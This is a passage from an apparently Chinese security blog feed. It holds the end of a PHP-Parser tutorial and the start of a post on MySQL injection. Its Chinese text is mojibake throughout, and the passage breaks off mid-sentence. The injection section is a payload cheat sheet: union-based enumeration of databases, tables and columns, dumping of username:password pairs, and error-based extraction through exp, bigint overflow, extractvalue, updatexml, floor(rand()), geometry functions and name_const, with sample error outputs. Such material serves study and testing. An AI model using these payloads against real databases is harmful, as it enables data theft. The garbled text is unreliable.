class="line">CODE;</span><br><span class="line"></span><br><span class="line"><span class="variable">$parser</span> = (<span class="keyword">new</span> ParserFactory)-&gt;create(ParserFactory::PREFER_PHP7);</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="variable">$stmts</span> = <span class="variable">$parser</span>-&gt;parse(<span class="variable">$code</span>);</span><br><span class="line">    <span class="comment">// $stmts is an array of statement nodes</span></span><br><span class="line">&#125; <span class="keyword">catch</span> (<span class="built_in">Error</span> <span class="variable">$e</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Parse Error: &#x27;</span>, <span class="variable">$e</span>-&gt;getMessage();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸€ä¸ª parser å®ä¾‹å¯ä»¥é‡å¤ä½¿ç”¨ä»¥è§£æå¤šä¸ªæ–‡ä»¶ã€‚</p><h5 id="èŠ‚ç‚¹è½¬å‚¨"><a href="#èŠ‚ç‚¹è½¬å‚¨" class="headerlink" title="èŠ‚ç‚¹è½¬å‚¨"></a>èŠ‚ç‚¹è½¬å‚¨</h5><p>å¦‚æœè¦ä»¥äººå¯è¯»çš„æ–¹å¼å»è½¬å‚¨ AST çš„è¯ï¼Œå¯ä»¥ä½¿ç”¨ <code>NodeDumper</code>ï¼›</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">use</span> <span class="title">PhpParser</span>\<span class="title">NodeDumper</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$nodeDumper</span> = <span class="keyword">new</span> NodeDumper;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$nodeDumper</span>-&gt;dump(<span class="variable">$stmts</span>), <span class="string">&quot;\n&quot;</span>;</span><br></pre></td></tr></table></figure><p>å¯¹äºä¹‹å‰çš„å®ä¾‹ï¼Œå°†ä¼šè¾“å‡ºå¦‚ä¸‹å†…å®¹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">array(</span><br><span class="line">    0: Stmt_Function(</span><br><span class="line">        attrGroups: array(</span><br><span class="line">        )</span><br><span class="line">        byRef: false</span><br><span class="line">        name: Identifier(</span><br><span class="line">            name: printLine</span><br><span class="line">        )</span><br><span class="line">        params: array(</span><br><span class="line">            0: Param(</span><br><span class="line">                attrGroups: array(</span><br><span class="line">                )</span><br><span class="line">                flags: 0</span><br><span class="line">                type: null</span><br><span class="line">                byRef: false</span><br><span class="line">                variadic: false</span><br><span class="line">                var: Expr_Variable(</span><br><span class="line">                    name: msg</span><br><span class="line">                )</span><br><span class="line">                default: null</span><br><span class="line">            )</span><br><span class="line">        )</span><br><span class="line">        returnType: null</span><br><span class="line">        stmts: array(</span><br><span class="line">            0: Stmt_Echo(</span><br><span class="line">                exprs: array(</span><br><span class="line">                    0: Expr_Variable(</span><br><span class="line">                        name: msg</span><br><span class="line">                    )</span><br><span class="line">                    1: Scalar_String(</span><br><span class="line">                        value: </span><br><span class="line">                    </span><br><span class="line">                    )</span><br><span class="line">                )</span><br><span class="line">            )</span><br><span class="line">        )</span><br><span class="line">    )</span><br><span class="line">    1: Stmt_Expression(</span><br><span class="line">        expr: Expr_FuncCall(</span><br><span class="line">            name: Name(</span><br><span class="line">                parts: array(</span><br><span class="line">                    0: printLine</span><br><span class="line">                )</span><br><span class="line">            )</span><br><span class="line">            args: array(</span><br><span class="line">                0: Arg(</span><br><span class="line">                    name: null</span><br><span class="line">                    value: Scalar_String(</span><br><span class="line">                        value: Hello World!!!</span><br><span class="line">                    )</span><br><span class="line">                    byRef: false</span><br><span class="line">                    unpack: false</span><br><span class="line">                )</span><br><span class="line">            )</span><br><span class="line">        )</span><br><span class="line">    )</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬è¿˜å¯ä»¥é€šè¿‡ä½¿ç”¨ <code>php-parse</code> è„šæœ¬ï¼Œä½¿ç”¨æ–‡ä»¶åæˆ–è€…ä»£ç å­—ç¬¦ä¸²è°ƒç”¨å®ƒæ¥è·å– ASTï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vendor/bin/php-parse test.php</span><br><span class="line">vendor/bin/php-parse &quot;&lt;?php foo();&quot;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/04/28/8YoSePjMbZUhdXm.png"></p><p>å¦‚æœæƒ³è¦å¿«é€Ÿè·å– AST ä¸­æŸäº›è¯­æ³•çš„è¡¨è¾¾æ–¹å¼çš„è¯ï¼Œè¿™æ ·å°±å¾ˆå¯ã€‚</p><h5 id="èŠ‚ç‚¹ğŸŒ³ç»“æ„"><a href="#èŠ‚ç‚¹ğŸŒ³ç»“æ„" class="headerlink" title="èŠ‚ç‚¹ğŸŒ³ç»“æ„"></a>èŠ‚ç‚¹ğŸŒ³ç»“æ„</h5><p>è§‚å¯Ÿä¸Šé¢çš„èŠ‚ç‚¹è½¬å‚¨ï¼Œæˆ‘ä»¬å¯ä»¥å‘ç°ä¸Šé¢ä»£ç ä¸­çš„ <code>$stms</code> æ˜¯ä¸¤ä¸ªèŠ‚ç‚¹çš„æ•°ç»„ï¼Œä¸€ä¸ª <code>Stmt_Function</code> å’Œä¸€ä¸ª <code>Stmt_Expression</code> èŠ‚ç‚¹ï¼Œå®ƒä»¬æ‰€å¯¹åº”çš„ç±»åç§°ä¸ºï¼š</p><ul><li><code>Stmt_Function</code> -&gt; <code>PhpParser\Node\Stmt\Function_</code></li><li><code>Stmt_Expression</code> -&gt; <code>PhpParser\Node\Stmt\Expression</code></li></ul><p>å¯èƒ½æœ‰äººæ³¨æ„åˆ°äº† Function ç±»çš„æœ€åé¢å¤šäº†ä¸€ä¸ª <code>_</code>ï¼Œä½†æ˜¯ Function æ˜¯ä¸€ä¸ªä¿ç•™å…³é”®å­—ï¼Œè¯¥åº“ä¸­çš„è®¸å¤šèŠ‚ç‚¹ç±»åç§°éƒ½å¸¦æœ‰å°¾éš <code>_</code>ï¼Œä»¥é¿å…ä¸å…³é”®å­—å†²çªã€‚</p><p>å› ä¸º PHP æ˜¯ä¸€ç§å¤§å‹è¯­è¨€ï¼Œæ‰€ä»¥å¤§æ¦‚æœ‰140å¤šä¸ªä¸åŒçš„èŠ‚ç‚¹ï¼Œä¸ºäº†æ›´å¥½åœ°ä½¿ç”¨å®ƒä»¬ï¼Œå°†å®ƒä»¬åˆ†ä¸ºäº†ä¸‰ç±»ï¼š</p><ul><li><code>PhpParser\Node\Stmt</code> æ˜¯è¯­å¥èŠ‚ç‚¹ï¼Œå³ä¸è¿”å›å€¼å¹¶ä¸”ä¸èƒ½å‡ºç°åœ¨è¡¨è¾¾å¼ä¸­çš„è¯­è¨€æ„é€ ï¼Œä¾‹å¦‚ç±»å®šä¹‰å°±æ˜¯ä¸€ä¸ªè¯­å¥ï¼Œå› ä¸ºå®ƒæ²¡æœ‰è¿”å›å€¼æ‰€ä»¥æˆ‘ä»¬ä¸èƒ½æ„é€ åƒ <code>func(class A &#123;&#125;);</code> è¿™æ ·çš„è¯­å¥</li></ul><ul><li><code>PhpParser\Node\Expr</code> æ˜¯è¡¨è¾¾å¼èŠ‚ç‚¹ï¼Œå³è¿”å›å€¼çš„è¯­è¨€æ„é€ ï¼Œå› æ­¤å¯ä»¥åœ¨å…¶ä»–è¡¨è¾¾å¼ä¸­å‡ºç°ï¼Œè¡¨è¾¾å¼çš„å®ä¾‹å¦‚ï¼š<ul><li><code>$var</code> (<code>PhpParser\Node\Expr\Variable</code>)</li><li><code>func()</code> (<code>PhpParser\Node\Expr\FuncCall</code>)</li></ul></li><li><code>PhpParser\Node\Scalar</code> æ˜¯è¡¨ç¤ºæ ‡é‡å€¼çš„èŠ‚ç‚¹ï¼Œæ¯”å¦‚ <code>&#39;string&#39;</code> (<code>PhpParser\Node\Scalar\String_</code>)ï¼Œ<code>0</code> (<code>PhpParser\Node\Scalar\LNumber</code>ï¼‰æˆ–è€…é­”æœ¯å¸¸æ•°æ¯”å¦‚ <code>__FILE__</code> (<code>PhpParser\Node\Scalar\MagicConst\File</code>)ï¼Œæ‰€æœ‰çš„<code>PhpParser\Node\Scalars</code>éƒ½æ‰©å±•äº†<code>PhpParser\Node\Expr</code>ï¼Œå› ä¸ºæ ‡é‡ä¹Ÿæ˜¯è¡¨è¾¾å¼ã€‚</li><li>è¿™ä¸¤ä¸ªç»„éƒ½ä¸å­˜åœ¨æŸäº›èŠ‚ç‚¹ï¼Œæ¯”å¦‚åç§°ï¼ˆ<code>PhpParser\Node\Name</code>ï¼‰å’Œè°ƒç”¨å‚æ•°ï¼ˆ<code>PhpParser\Node\Arg</code>ï¼‰çš„èŠ‚ç‚¹ã€‚</li></ul><p><code>Node\Stmt\Expression</code>èŠ‚ç‚¹æœ‰ç‚¹ä»¤äººè¿·æƒ‘ï¼Œå› ä¸ºå®ƒæ—¢æœ‰æœ¯è¯­ statement åˆæœ‰ expressionï¼Œè¿™ä¸ªèŠ‚ç‚¹æœ‰åˆ«äºè¢«ç§°ä¸º <code>Node\Expr</code> çš„ exprï¼Œæ˜¯ä¸€ä¸ªç”±è¡¨è¾¾å¼ <code>Node\Stmt\Expression</code> ä»£è¡¨çš„åŒ…å« expr ä½œä¸ºå­èŠ‚ç‚¹çš„ expression statementã€‚</p>]]></content>
      
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> PROJECT </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å°è°ˆSQLæ³¨å…¥</title>
      <link href="2021/04/26/%E5%B0%8F%E8%B0%88SQL%E6%B3%A8%E5%85%A5/"/>
      <url>2021/04/26/%E5%B0%8F%E8%B0%88SQL%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<p>SQL æ³¨å…¥è¿™æ–¹é¢ä¸€ç›´æŒºèœçš„ï¼Œæ•´ç†ä¸€ä¸‹å§</p><h2 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h2><h3 id="Union-Based"><a href="#Union-Based" class="headerlink" title="Union Based"></a>Union Based</h3><h4 id="åˆ¤æ–­-column-æ•°åŠå›æ˜¾æ•°æ®å­—æ®µä½ç½®"><a href="#åˆ¤æ–­-column-æ•°åŠå›æ˜¾æ•°æ®å­—æ®µä½ç½®" class="headerlink" title="åˆ¤æ–­ column æ•°åŠå›æ˜¾æ•°æ®å­—æ®µä½ç½®"></a>åˆ¤æ–­ column æ•°åŠå›æ˜¾æ•°æ®å­—æ®µä½ç½®</h4><ul><li><code>order/group by N</code></li><li><code>union select 1,2,3...N</code></li></ul><hr><p>æ³¨æ„ï¼š</p><ul><li>è‹¥ç¡®å®šé¡µé¢æœ‰å›æ˜¾ï¼Œä½†æ˜¯é¡µé¢ä¸­å¹¶æ²¡æœ‰æˆ‘ä»¬å®šä¹‰çš„ç‰¹æ®Šæ ‡è®°æ•°å­—å‡ºç°ï¼Œå¯èƒ½æ˜¯é¡µé¢é™åˆ¶äº†å•è¡Œæ•°æ®è¾“å‡ºï¼Œæˆ‘ä»¬è®©å‰è¾¹çš„ select æŸ¥è¯¢æ¡ä»¶è¿”å›ç»“æœä¸ºç©ºå³å¯</li><li>æ³¨æ„ä¸€å®šè¦æ‹¼æ¥å¤Ÿè¶³å¤Ÿçš„å­—æ®µæ•°ï¼Œå¦åˆ™ SQL è¯­å¥æŠ¥é”™ã€‚PSï¼šæ­¤æ–¹æ³•ä¹Ÿå¯ä½œä¸ºåˆ¤æ–­å‰æ¡ select è¯­å¥çš„æ–¹æ³•ä¹‹ä¸€</li></ul><hr><h4 id="çˆ†åº“ã€è¡¨ã€å­—æ®µ"><a href="#çˆ†åº“ã€è¡¨ã€å­—æ®µ" class="headerlink" title="çˆ†åº“ã€è¡¨ã€å­—æ®µ"></a>çˆ†åº“ã€è¡¨ã€å­—æ®µ</h4><ul><li><p>MySQL version &lt; 5.0</p><ul><li><p>ç”±äº MySQL çš„ä½ç‰ˆæœ¬ç¼ºä¹ç³»ç»Ÿåº“<code>information_schema</code>ï¼Œæ•…é€šå¸¸æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬æ— æ³•ç›´æ¥æŸ¥è¯¢è¡¨åï¼Œå­—æ®µï¼ˆåˆ—ï¼‰åç­‰ä¿¡æ¯</p><p>è¿™æ—¶å€™åªèƒ½é çŒœæ¥è§£å†³ï¼Œç›´æ¥çŒœè¡¨åä¸åˆ—åæ˜¯ä»€ä¹ˆï¼Œç”šè‡³æ˜¯åº“åï¼Œå†ä½¿ç”¨è”åˆæŸ¥è¯¢å–æ•°æ®</p><p>è‹¥çŸ¥é“ä»…è¡¨åè€Œä¸çŸ¥é“åˆ—ï¼ˆå­—æ®µï¼‰åï¼Œå¯ä»¥å°è¯•ï¼š</p><ul><li><p>å•å­—æ®µï¼š<code>select *,1,2,xxx from table_name</code></p></li><li><p>å¤šå­—æ®µï¼š<code>select x from(select 1,2,3,4,xxx from table_name union select * from table_name)a</code></p></li></ul></li></ul></li><li><p>MySQL version &gt;= 5.0</p><ul><li><p>çˆ† schema</p><ul><li><code>union select 1,2,schema_name from information_schema.schemata limit 1,1</code></li></ul></li><li><p>çˆ† table</p><ul><li><p><code>union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()</code></p></li><li><p><code>union select 1,2,table_name from information_schema.tables where table_schema=database() limit 0,1</code></p></li></ul></li><li><p>çˆ† column</p><ul><li><code>union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#39;Du1&#39;</code></li><li><code>union select 1,2,column_name from information_schema.columns where table_schema=database() limit 0,1</code></li></ul></li><li><p>å‡º</p><ul><li><code>select heart from Du1</code></li><li><code>SELECT CONCAT(username, &quot;:&quot; ,password) FROM Du1.USER</code></li></ul></li></ul></li></ul><h3 id="Error-Based"><a href="#Error-Based" class="headerlink" title="Error Based"></a>Error Based</h3><p>é€šè¿‡ç‰¹æ®Šå‡½æ•°çš„æŠ¥é”™ä½¿å…¶å‚æ•°è¢«é¡µé¢è¾“å‡º</p><hr><p>å‰æï¼š</p><ul><li>æœåŠ¡å™¨å¼€å¯æŠ¥é”™ä¿¡æ¯è¿”å›ï¼Œä¹Ÿå°±æ˜¯å‘ç”Ÿé”™è¯¯æ—¶è¿”å›æŠ¥é”™ä¿¡æ¯</li></ul><p>æ³¨æ„ï¼š</p><ul><li>æŠ¥é”™å‡½æ•°é€šå¸¸æœ‰æœ€é•¿æŠ¥é”™è¾“å‡ºçš„é™åˆ¶ï¼Œé¢å¯¹è¿™ç§æƒ…å†µï¼Œå¯ä»¥è¿›è¡Œåˆ†å‰²è¾“å‡º<ul><li><code>#define ERRMSGSIZE (512)</code></li></ul></li><li>ç‰¹æ®Šå‡½æ•°çš„ç‰¹æ®Šå‚æ•°è¿›è¿è¡Œä¸€ä¸ªå­—æ®µã€ä¸€è¡Œæ•°æ®çš„è¿”å›ï¼Œä½¿ç”¨ group_concat ç­‰å‡½æ•°èšåˆæ•°æ®å³å¯</li></ul><hr><h4 id="åˆ©ç”¨-overflow"><a href="#åˆ©ç”¨-overflow" class="headerlink" title="åˆ©ç”¨ overflow"></a>åˆ©ç”¨ overflow</h4><p>æ³¨ï¼šMySQL version &gt; 5.5.5 çš„æ—¶å€™ overflow æ‰ä¼šæœ‰é”™è¯¯è®¯æ¯ï¼ŒMySQL version &gt; 5.5.53 çš„æ—¶å€™ä¸ä¼šæ˜¾ç¤ºæŸ¥è¯¢ç»“æœ</p><h5 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h5><p>é€‚ç”¨ç‰ˆæœ¬ï¼š5.5.49~5.5.5</p><p>è¯¥å‡½æ•°ä¼šè¿”å› e çš„ x æ¬¡æ–¹ç»“æœ</p><p>å› ä¸º MySQL èƒ½è®°å½•çš„ double æ•°å€¼èŒƒå›´æœ‰é™ï¼Œä¸€æ—¦ç»“æœè¶…è¿‡èŒƒå›´ï¼Œåˆ™è¯¥å‡½æ•°æŠ¥é”™</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELECT exp(709) &#x3D;&gt; 8.218407461554972e307</span><br><span class="line">SELECT exp(710) &#x3D;&gt; ERROR</span><br></pre></td></tr></table></figure><p>æ•…å¯ä½œ payloadï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELECT exp(~(SELECT * FROM (SELECT user())x));</span><br><span class="line">ERROR 1690(22003): DOUBLE value is out of range in &#39;exp(~((SELECT &#39;root@localhost&#39; FROM dual)))&#39;</span><br></pre></td></tr></table></figure><p>æŒ‰ç†æ¥è¯´ <code>pow</code> åº”è¯¥ä¹Ÿå¯ä»¥ï¼ŒåŸç†ç›¸åŒ</p><hr><h5 id="bigint-æ•°å€¼æ“ä½œ"><a href="#bigint-æ•°å€¼æ“ä½œ" class="headerlink" title="bigint æ•°å€¼æ“ä½œ"></a>bigint æ•°å€¼æ“ä½œ</h5><p>åˆ©ç”¨äº†å½“ MySQL æ•°æ®åº“çš„æŸäº›è¾¹ç•Œæ•°å€¼è¿›è¡Œæ•°å€¼è¿ç®—æ—¶ï¼Œä¼šæŠ¥é”™çš„åŸç†</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">SELECT ~0 &#x3D;&gt; 18446744073709551615</span><br><span class="line">SELECT ~0 + 1 &#x3D;&gt; ERROR</span><br><span class="line">SELECT cot(0) &#x3D;&gt; ERROR</span><br><span class="line"></span><br><span class="line">select !(select * from(select user())a)-~0;</span><br><span class="line">select (select(!x-~0)from(select(select user())x)a);</span><br><span class="line">ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in &#39;((not(&#39;root@localhost&#39;)) - ~(0))&#39;</span><br></pre></td></tr></table></figure><h4 id="åˆ©ç”¨-xpath"><a href="#åˆ©ç”¨-xpath" class="headerlink" title="åˆ©ç”¨ xpath"></a>åˆ©ç”¨ xpath</h4><h5 id="extractvalue-é•¿åº¦é™åˆ¶32ä½"><a href="#extractvalue-é•¿åº¦é™åˆ¶32ä½" class="headerlink" title="extractvalue (é•¿åº¦é™åˆ¶32ä½)"></a>extractvalue (é•¿åº¦é™åˆ¶32ä½)</h5><p>åŸç†ï¼šå‰åæ·»åŠ  ~ ä½¿å…¶ä¸ç¬¦åˆ xpath æ ¼å¼ä»è€ŒæŠ¥é”™</p><p>é€‚ç”¨ç‰ˆæœ¬ 5.1.5+</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select extractvalue(1,concat(0x7e,(select @@version),0x7e));</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#39;~5.7.17~&#39;</span><br></pre></td></tr></table></figure><h5 id="updatexml-é•¿åº¦é™åˆ¶32ä½"><a href="#updatexml-é•¿åº¦é™åˆ¶32ä½" class="headerlink" title="updatexml (é•¿åº¦é™åˆ¶32ä½)"></a>updatexml (é•¿åº¦é™åˆ¶32ä½)</h5><p>é€‚ç”¨ç‰ˆæœ¬ 5.1.5+</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select updatexml(1,concat(0x7e,(select @@version),0x7e),1);</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#39;~5.7.17~&#39;</span><br></pre></td></tr></table></figure><h4 id="åˆ©ç”¨è™šæ‹Ÿè¡¨æŠ¥é”™-ä¸»é”®é‡å¤"><a href="#åˆ©ç”¨è™šæ‹Ÿè¡¨æŠ¥é”™-ä¸»é”®é‡å¤" class="headerlink" title="åˆ©ç”¨è™šæ‹Ÿè¡¨æŠ¥é”™ / ä¸»é”®é‡å¤"></a>åˆ©ç”¨è™šæ‹Ÿè¡¨æŠ¥é”™ / ä¸»é”®é‡å¤</h4><p>åŸç†ï¼šç®€å•æ¥è¯´ï¼Œæ˜¯ç”±äº where æ¡ä»¶æ¯æ‰§è¡Œä¸€æ¬¡ï¼Œrand å‡½æ•°å°±ä¼šæ‰§è¡Œä¸€æ¬¡ï¼Œå¦‚æœåœ¨ç”±äºåœ¨ç»Ÿè®¡æ•°æ®æ—¶åˆ¤æ–­ä¾æ®ä¸èƒ½åŠ¨æ€æ”¹å˜ï¼Œæ•… <code>rand()</code> ä¸èƒ½åæ¥åœ¨<code>order/group by</code> ä¸Š</p><hr><p>ä¸¾æ —å­ï¼š</p><p>å‡è®¾ USER è¡¨æœ‰ä¸‰æ¡æ•°æ®ï¼Œæˆ‘ä»¬é€šè¿‡ï¼š<code>select * from USER group by username</code> æ¥é€šè¿‡å…¶ä¸­çš„ username å­—æ®µè¿›è¡Œåˆ†ç»„</p><p>æ­¤è¿‡ç¨‹ä¼šå…ˆå»ºç«‹ä¸€ä¸ªè™šæ‹Ÿè¡¨ï¼Œå­˜åœ¨ä¸¤ä¸ªå­—æ®µï¼š<code>keyï¼Œcount</code></p><p>å…¶ä¸­æˆ‘ä»¬é€šè¿‡ username æ¥åˆ¤æ–­ï¼Œå…¶åœ¨æ­¤å¤„æ˜¯å­—æ®µï¼Œé¦–å…ˆå…ˆå–ç¬¬ä¸€è¡Œçš„æ•°æ®ï¼š<code>username=Du1&amp;password=0312</code></p><p>username ä¸º Du1 å‡ºç°ä¸€æ¬¡ï¼Œåˆ™ç°åœ¨è™šè¡¨å†…æŸ¥è¯¢æ˜¯å¦å­˜åœ¨ Du1ï¼Œè‹¥å­˜åœ¨ï¼Œåˆ™ count + 1ï¼Œè‹¥ä¸å­˜åœ¨ï¼Œåˆ™æ·»åŠ  Du1ï¼Œå…¶ count ä¸º 1</p><p>å¯¹äº<code>floor(rand(0)*2)</code>ï¼Œå…¶ä¸­<code>rand()</code>å‡½æ•°ï¼Œä¼šç”Ÿæˆ 0 ~ 1 ä¹‹é—´éšæœºä¸€ä¸ªå°æ•°ã€<code>floor()</code>å–æ•´æ•°éƒ¨åˆ†ã€0 æ˜¯éšæœºå› å­ã€ä¹˜ 2 æ˜¯ä¸ºäº†è®©å¤§äº 0.5 çš„å°æ•°é€šè¿‡ floor å‡½æ•°å¾— 1</p><p>è‹¥è¡¨ä¸­æœ‰ä¸‰è¡Œæ•°æ®ï¼šæˆ‘ä»¬é€šè¿‡<code>select * from USER group by floor(rand(0)*2)</code>è¿›è¡Œæ’åºçš„è¯</p><blockquote><p>æ³¨æ„ï¼š</p><p>ç”±äº<code>rand(0)</code>çš„éšæœºå› å­æ˜¯è¢«å›ºå®šçš„ï¼Œæ•…å…¶äº§ç”Ÿçš„éšæœºæ•°ä¹Ÿè¢«å›ºå®šäº†ï¼Œé¡ºåºä¸ºï¼š011011â€¦â€¦</p></blockquote><p>é¦–å…ˆ<code>group by</code>éœ€è¦æ‰§è¡Œçš„è¯ï¼Œéœ€è¦ç¡®å®šåˆ†ç»„å› å­ï¼Œæ•…<code>floor(rand(0)*2)</code>è¢«æ‰§è¡Œä¸€æ¬¡ï¼Œå¾—åˆ°çš„ç»“æœä¸º 0ï¼Œæ¥ç€åœ¨è™šè¡¨å†…æ£€ç´¢ 0ï¼Œå‘ç°è™šè¡¨æ²¡æœ‰é”®å€¼ä¸º 0 çš„è®°å½•ï¼Œæ•…æ·»åŠ ä¸Šï¼Œåœ¨è¿›è¡Œæ·»åŠ æ—¶ï¼š<code>floor(rand(0)*2)</code>ç¬¬äºŒæ¬¡è¢«æ‰§è¡Œï¼Œå¾—åˆ°ç»“æœ 1ï¼Œäºæ˜¯è™šæ‹Ÿè¡¨æ’å…¥çš„å†…å®¹ä¸º<code>key=1&amp;count=1</code></p><p>ç¬¬äºŒæ¬¡æ‰§è¡Œ<code>group by</code>æ—¶ï¼š<code>floor(rand(0)*2)</code>å…ˆè¢«è¿è¡Œä¸€æ¬¡ï¼Œä¹Ÿå°±æ˜¯ç¬¬ä¸‰æ¬¡è¿è¡Œã€‚å¾—åˆ°ç»“æœ 1ï¼ŒæŸ¥è¯¢è™šè¡¨å‘ç°æ•°æ®å­˜åœ¨ï¼Œå› è€Œç›´æ¥è®©è™šè¡¨å†…çš„<code>key=1</code>çš„ count åŠ ä¸€å³å¯ï¼Œ<code>floor(..)</code>åªè¿è¡Œäº†ä¸€æ¬¡</p><p>ç¬¬ä¸‰æ¬¡æ‰§è¡Œ<code>group by</code>æ—¶ï¼Œ<code>floor(rand(0)*2)</code>è¢«æ‰§è¡Œç¬¬å››æ¬¡ï¼Œå¾—åˆ°ç»“æœ 0ï¼ŒæŸ¥è¯¢è™šè¡¨ä¸å­˜åœ¨ã€‚å†æ’å…¥è™šè¡¨æ—¶ï¼Œ<code>floor(â€¦)</code>è¢«æ‰§è¡Œç¬¬äº”æ¬¡ï¼Œå¾—åˆ°ç»“æœ 1ï¼Œæ•…æ­¤æ—¶è™šè¡¨å°†æ’å…¥çš„å€¼ä¸º<code>key=1&amp;count=1</code>ï¼Œæ³¨æ„ï¼Œæ­¤æ—¶è™šè¡¨å·²æœ‰ä¸€æ¡è®°å½•ä¸ºï¼š<code>key=1&amp;count=2</code>ï¼Œå¹¶ä¸”å­—æ®µ key ä¸ºä¸»é”®ï¼Œå…·æœ‰ä¸å¯é‡å¤æ€§ï¼Œæ•…è™šè¡¨åœ¨å°è¯•æ’å…¥æ—¶å°†äº§ç”Ÿé”™è¯¯</p><hr><p>æ•…å¯ä½œ payloadï¼š<code>union select count(*),2,concat(&#39;:&#39;,(select database()),&#39;:&#39;,floor(rand()*2))as a from information_schema.tables group by a</code></p><p><img src="https://i.loli.net/2021/04/26/zfHIm7y31G5MsZU.png"></p><p><code>select count(*) from test group by concat(version(),floor(rand(0)*2));</code></p><p><img src="https://i.loli.net/2021/04/26/R6EMWit5lazIePC.png"></p><h4 id="åˆ©ç”¨å‡ ä½•å‡½æ•°"><a href="#åˆ©ç”¨å‡ ä½•å‡½æ•°" class="headerlink" title="åˆ©ç”¨å‡ ä½•å‡½æ•°"></a>åˆ©ç”¨å‡ ä½•å‡½æ•°</h4><ul><li>GeometryCollectionï¼š<code>id=1 AND GeometryCollection((select * from (select* from(select user())a)b))</code></li><li>polygonï¼š<code>id=1 AND polygon((select * from(select * from(select user())a)b))</code></li><li>multipointï¼š<code>id=1 AND multipoint((select * from(select * from(select user())a)b))</code></li><li>multilinestringï¼š<code>id=1 AND multilinestring((select * from(select * from(select user())a)b))</code></li><li>linestringï¼š<code>id=1 AND LINESTRING((select * from(select * from(select user())a)b))</code></li><li>multipolygonï¼š<code>id=1 AND multipolygon((select * from(select * from(select user())a)b))</code></li></ul><h4 id="åˆ©ç”¨ä¸å­˜åœ¨çš„å‡½æ•°"><a href="#åˆ©ç”¨ä¸å­˜åœ¨çš„å‡½æ•°" class="headerlink" title="åˆ©ç”¨ä¸å­˜åœ¨çš„å‡½æ•°"></a>åˆ©ç”¨ä¸å­˜åœ¨çš„å‡½æ•°</h4><p>éšä¾¿ç”¨ä¸€ä¸ªä¸å­˜åœ¨çš„å‡½æ•°ï¼Œå¯èƒ½ä¼šæ‘¸å¥–å¾—åˆ°å½“å‰æ‰€åœ¨çš„æ•°æ®åº“åç§°</p><p><img src="https://i.loli.net/2021/04/26/UCKcN46HYWITbBu.png"></p><h4 id="åˆ©ç”¨-name-const"><a href="#åˆ©ç”¨-name-const" class="headerlink" title="åˆ©ç”¨ name_const"></a>åˆ©ç”¨ name_const</h4><p>ä»…å¯å–æ•°æ®åº“ç‰ˆæœ¬ä¿¡æ¯</p><p>payloadï¼š<code>select * from(select name_const(version(),0x1),name_const(version(),0x1))a</code></p><p><img src="https://i.loli.net/2021/04/26/XhTW5evptx8EHnC.png"></p><h4 id="uuid-ç›¸å…³å‡½æ•°"><a href="#uuid-ç›¸å…³å‡½æ•°" class="headerlink" title="uuid ç›¸å…³å‡½æ•°"></a>uuid ç›¸å…³å‡½æ•°</h4><p>é€‚ç”¨ç‰ˆæœ¬ï¼š8.0.x</p><p>because of å‚æ•°æ 